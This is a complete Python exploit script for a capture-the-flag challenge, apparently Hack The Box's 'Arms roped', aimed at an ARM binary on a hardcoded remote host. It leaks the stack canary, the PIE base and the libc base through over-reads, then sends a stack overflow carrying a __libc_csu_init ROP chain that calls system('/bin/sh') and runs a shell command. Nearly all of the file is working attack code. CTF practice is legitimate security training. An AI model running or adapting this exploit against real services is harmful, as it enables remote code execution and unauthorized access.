#!/usr/bin/env python3
import argparse
import socket
import struct
import sys
import time


DEFAULT_HOST = "154.57.164.72"
DEFAULT_PORT = 31272

# Offsets in the PIE.
GOT_BASE = 0x11000
PUTS_GOT = 0x11024
CSU_POP = 0x9EC
CSU_CALL = 0x9CC
STRING_STORER = 0x790

# Offsets in the supplied ARM hard-float libc.
PUTS = 0x49BA5
SYSTEM = 0x2F511
BIN_SH = 0xDCE0C
LIBC_START_MAIN_RETURN = 0x17525


def p32(value):
    return struct.pack("<I", value & 0xFFFFFFFF)


def u32(value):
    return struct.unpack("<I", value)[0]


def recvline(sock, timeout=5):
    sock.settimeout(timeout)
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise EOFError("connection closed")
        data += chunk
    return bytes(data)


def csu_call(pie, function_slot, r0, r1=0, r2=0, return_to=0):
    """Call *function_slot(r0, r1, r2) using __libc_csu_init."""
    chain = b"".join(
        p32(x)
        for x in (
            0,                 # r4: loop counter
            function_slot,     # r5: address of function pointer
            1,                 # r6: loop limit
            r0,                # r7 -> r0
            r1,                # r8 -> r1
            r2,                # r9 -> r2
            0,                 # r10
            pie + CSU_CALL,    # pc
        )
    )
    # CSU_CALL falls through to this second eight-register pop.
    chain += p32(0) * 7 + p32(return_to)
    return chain


def overflow(canary, saved_pc, chain):
    # "quit" is required to leave string_storer's input loop and execute the
    # canary check/function epilogue after corrupting the saved return address.
    return b"quit" + b"A" * 28 + canary + b"P" * 4 + p32(0) + p32(0) + p32(saved_pc) + chain


def attempt(host, port, command, verbose=False):
    sock = socket.create_connection((host, port), timeout=5)
    try:
        # puts() discloses the remaining three canary bytes after byte 0 is
        # changed from NUL to a printable byte.
        sock.sendall(b"A" * 33 + b"\n")
        line = recvline(sock)
        if len(line) != 37 or not line.startswith(b"A" * 33):
            raise ValueError("short canary disclosure")
        canary = b"\0" + line[33:36]
        if verbose:
            print(f"[*] canary leak {canary.hex()}", file=sys.stderr, flush=True)

        # Do the same to saved r4. It is PIE+0x11000 and page aligned, so its
        # overwritten low byte is known to have originally been zero.
        sock.sendall(b"B" * 41 + b"\n")
        line = recvline(sock)
        if len(line) < 49 or not line.startswith(b"B" * 41):
            raise ValueError("short PIE/stack disclosure")
        saved_r4 = u32(b"\0" + line[41:44])
        main_fp = u32(line[44:48])
        pie = saved_r4 - GOT_BASE
        if pie < 0 or pie & 0xFFF:
            raise ValueError("invalid PIE disclosure")
        if verbose:
            print(f"[*] PIE {pie:#x}, main fp {main_fp:#x}", file=sys.stderr, flush=True)

        # At offset 72 is main's untouched saved LR. It is the Thumb return
        # address immediately after libc's `blx main` instruction.
        sock.sendall(b"L" * 72 + b"\n")
        line = recvline(sock)
        if len(line) < 77 or not line.startswith(b"L" * 72):
            raise ValueError("short libc disclosure")
        libc_return = u32(line[72:76])
        libc = libc_return - LIBC_START_MAIN_RETURN
        if libc < 0 or libc & 0xFFF:
            raise ValueError("invalid libc disclosure")

        # string_storer's buffer is main_fp-72. Put the system address just
        # after CSU's second pop frame and point r5 at that stack word.
        buffer_addr = main_fp - 72
        system_slot_offset = 116
        stage2 = overflow(
            canary,
            pie + CSU_POP,
            csu_call(
                pie,
                buffer_addr + system_slot_offset,
                libc + BIN_SH,
            ),
        )
        if len(stage2) != system_slot_offset:
            raise AssertionError("unexpected stage-two layout")
        stage2 += p32(libc + SYSTEM)
        if b"\n" in stage2:
            raise ValueError("newline in stage two")

        if verbose:
            print(
                f"[+] canary={u32(canary):#x} pie={pie:#x} "
                f"stack={main_fp:#x} libc={libc:#x}",
                file=sys.stderr,
            )
        sock.sendall(stage2 + b"\n")
        # The "quit" prefix takes the epilogue path, so there is no echo.
        time.sleep(0.2)
        sock.sendall(command.encode() + b"\n")

        sock.settimeout(3)
        output = bytearray()
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            output += chunk
            if b"HTB{" in output and b"}" in output:
                break
        return bytes(output)
    finally:
        sock.close()


def main():
    parser = argparse.ArgumentParser(description="Exploit Arms roped")
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("-c", "--command", default="cat flag.txt")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--attempts", type=int, default=100)
    args = parser.parse_args()

    # Randomized addresses occasionally contain a newline/NUL in a leak or
    # newline in a scanf-delimited payload. Reconnecting is the clean solution.
    for number in range(1, args.attempts + 1):
        try:
            output = attempt(args.host, args.port, args.command, args.verbose)
            if output:
                sys.stdout.buffer.write(output)
                return
        except (OSError, EOFError, ValueError) as error:
            if args.verbose:
                print(f"[-] attempt {number}: {error}", file=sys.stderr)
    raise SystemExit("exploit failed: retry budget exhausted")


if __name__ == "__main__":
    main()
